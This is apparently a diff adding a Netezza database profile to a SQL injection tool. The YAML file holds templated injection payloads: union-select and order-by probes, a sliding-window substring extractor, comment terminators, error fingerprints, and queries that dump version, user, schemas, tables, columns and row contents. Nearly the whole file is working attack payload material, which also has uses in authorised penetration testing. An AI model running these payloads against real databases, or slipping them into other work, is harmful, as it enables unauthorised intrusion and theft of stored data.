@@ -1,0 +1,145 @@
+vendor: Netezza
+# NetezzaSoftwareEmulator_7.2.1.ova
+# jdbc:netezza://127.0.0.1:5480/SYSTEM
+# admin password
+
+resource:
+ info: |
+  version()
+  ||'${enclose_value_sql}'
+  ||'database()'
+  ||'${enclose_value_sql}'
+  ||'user()'
+  ||'${trail_sql}'
+
+ schema:
+  database: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
+           ,
+           '${trail_sql}'
+       )
+       ||'${trail_sql}'
+   from (
+       select
+           SCHEMA_NAME r,
+           count(TABLE_NAME) q
+       from INFORMATION_SCHEMA.tables
+       right join INFORMATION_SCHEMA.schemata
+       on SCHEMA_NAME = table_schema
+       group by r
+       ${limit}
+   ) x
+
+  table: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
+           ,
+           '${trail_sql}'
+       )
+       ||'${trail_sql}'
+   from (
+       select
+           TABLE_NAME r,
+           '0' q
+       from information_schema.tables
+       where TABLE_SCHEMA = '${database}'
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
+           ,
+           '${trail_sql}'
+       )
+       ||'${trail_sql}'
+   from (
+       select COLUMN_NAME r
+       from information_schema.columns
+       where TABLE_SCHEMA = '${database}'
+       and TABLE_NAME = '${table}'
+       order by r
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select 
+        coalesce(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || q
+            || '${enclose_value_sql}'
+            || '${separator_cell_sql}'
+            ,
+            '${trail_sql}'
+        )
+        ||'${trail_sql}'
+    from (
+         select
+             ${fields} r,
+             count(*) q
+         from ${database}.${table}
+         group by r
+         ${limit}
+    ) x
+   fields:
+    field: trim(coalesce('${field.value}', ''))
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           '${lead}'
+           || substr(
+               (${injection}),
+               ${window.char},
+               ${capacity}
+           )
+   )
+  limit: limit 1, ${limit.value}
+  failsafe: "''||1337${indice}7330%2b1"
+  calibrator: repeat('${calibrator_sql}', 65536)
+  limitBoundary: 0
+  # Prefix + mandatory before --+-
+  # JDBC requirement
+  endingComment: +--+-
+  fingerprint:
+   errorMessage:
+    - netezza
+   orderByErrorMessage:
+    - ORDER BY position 1337 is not in target list
+
+ normal:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select 
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+   )
+  orderBy: order by 1337
